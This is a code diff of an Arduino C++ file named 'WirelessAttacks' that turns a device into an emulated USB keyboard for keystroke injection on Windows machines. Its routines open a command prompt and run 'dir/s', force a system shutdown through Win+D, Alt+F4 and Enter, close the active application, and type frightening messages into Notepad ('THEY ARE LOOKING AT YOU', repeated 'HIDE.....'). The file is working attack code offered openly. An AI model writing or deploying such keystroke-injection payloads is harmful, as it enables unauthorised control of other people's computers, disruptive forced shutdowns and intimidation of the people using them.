@@ -1,44 +1,104 @@
 #include "WirelessAttacks.h"
-
-Keyboard_ USBKeyboard;
-
-
 void Wireless_Attacks::init()
 {
     Serial.begin(9600);
-    USBKeyboard.begin();
+    Keyboard.begin();
 }
-void Wireless_Attacks::TEST_1()
-{
-    USBKeyboard.press(KEY_LEFT_GUI);
-    USBKeyboard.press('r');
+void Wireless_Attacks::TEST_1() {
+    Keyboard.press(KEY_LEFT_GUI);
     delay(100);
-    USBKeyboard.release(KEY_LEFT_GUI);
-    USBKeyboard.print("cmd");
-    USBKeyboard.press(KEY_RETURN);
+    Keyboard.press('r');
+    delay(100); 
+    Keyboard.releaseAll(); 
+    delay(100); 
+    Keyboard.print("cmd");
+    delay(100); 
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(1000);
+    Keyboard.print("color a");
     delay(100);
-    USBKeyboard.release(KEY_RETURN);
-    USBKeyboard.print("color a");
-    USBKeyboard.press(KEY_RETURN);
-    USBKeyboard.release(KEY_RETURN);
-    USBKeyboard.print("dir/s");
-    USBKeyboard.press(KEY_RETURN);
-    USBKeyboard.release(KEY_RETURN);
-    delay(5);
-    USBKeyboard.press(KEY_F11);
-    USBKeyboard.releaseAll();
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(1000);
+    Keyboard.print("dir/s");
+    delay(100);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(1000);
+    Keyboard.press(KEY_F11);
+    delay(100);
+    Keyboard.releaseAll();
 }
+
 
 void Wireless_Attacks::RemoteShutdown()
 {
-    USBKeyboard.press(KEY_LEFT_GUI);
-    USBKeyboard.press('d');
-    USBKeyboard.releaseAll();
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('d');
+    Keyboard.releaseAll();
     delay(2);
-    USBKeyboard.press(KEY_LEFT_ALT);
-    USBKeyboard.press(KEY_F4);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(KEY_F4);
     delay(3);
-    USBKeyboard.releaseAll();
-    USBKeyboard.press(KEY_RETURN);
-    USBKeyboard.releaseAll();
+    Keyboard.releaseAll();
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+}
+
+void Wireless_Attacks::CloseApplication()
+{
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press(KEY_F4);
+    Keyboard.releaseAll();
+}
+
+void Wireless_Attacks::RickRoll()
+{
+
+}
+
+void Wireless_Attacks::CreepyMessage()
+{
+    Keyboard.press(KEY_LEFT_GUI);
+    delay(100);
+    Keyboard.press('r');
+    delay(100); 
+    Keyboard.releaseAll(); 
+    delay(100); 
+    Keyboard.print("cmd");
+    delay(100); 
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(500);
+    Keyboard.print("start notepad");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(400);
+    Keyboard.print("THEY ARE LOOKING AT YOU");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
+    Keyboard.print("YOU ARE NOT SAFE!");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
+    Keyboard.print("THEY ARE AFTER YOUR SOUL.......");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
+    Keyboard.print("YOU NEED TO HIDE!");
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+    delay(2000);
+    Keyboard.print("THEY ARE COMMING FOR YOU");
+    delay(4000);
+    for(int i = 0; i < 30; i++)
+    {
+        Keyboard.press(KEY_RETURN);
+        Keyboard.release(KEY_RETURN);
+        Keyboard.print("HIDE.....");
+        delay(1000);
+        
+    }
 }
